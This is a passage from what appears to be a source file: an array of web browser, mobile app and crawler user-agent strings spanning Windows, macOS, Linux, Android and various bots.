"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
"Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
"MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
"Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
"Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
"Wget/1.17.1 (linux-gnu)",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
"Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
"WirtschaftsWoche-iOS-1.1.14-20200824.1315",
"[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
"Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
"DoCoMo/2.0 P903i(c100;TB;W24H12)",
"DoCoMo/2.0 P903i",
"DoCoMo/2.0 SH10C(c500;TB;W16H12)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
"HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
"HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
"com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
"Mogujie4Android/NAMhuawei/1290",
"Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
"Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
"Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
"Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
"Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
"nokia-7.1-safari",
"NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
"Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
"Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
"Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
"Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
"Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
"Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
"Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
